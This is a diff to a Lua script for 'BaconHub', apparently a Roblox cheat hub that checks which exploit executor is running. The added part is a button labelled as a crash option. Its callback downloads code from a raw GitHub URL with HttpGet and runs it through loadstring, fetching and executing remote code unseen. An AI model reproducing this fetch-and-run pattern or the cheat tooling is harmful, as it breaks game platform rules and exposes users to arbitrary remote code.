@@ -75,7 +75,7 @@ print("Bacon Deteced You Executor Hydrogen")
 
 getgenv().FrameMode = true
 getgenv().UpdateMode = true
-elseif Hydrogen then
+elseif Furk then
 print("Bacon Deteced You Executor Furk")
 
 getgenv().FrameMode = true
@@ -148,6 +148,13 @@ local Label = Tab:CreateLabel("Welcome "..player.Name.." To BaconHub🥓 / Bacon
 local Label = Tab:CreateLabel("Game Place Id : "..PlaceId.." ")
 
 local Label = Tab:CreateLabel("Expliot Executor : "..client.." ")
+
+local Button = Tab:CreateButton({
+   Name = "Crash (My Self For You)",
+   Callback = function()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source',true))()
+   end,
+})
 
 local Tab = Window:CreateTab("Credit", 9766675093)
 
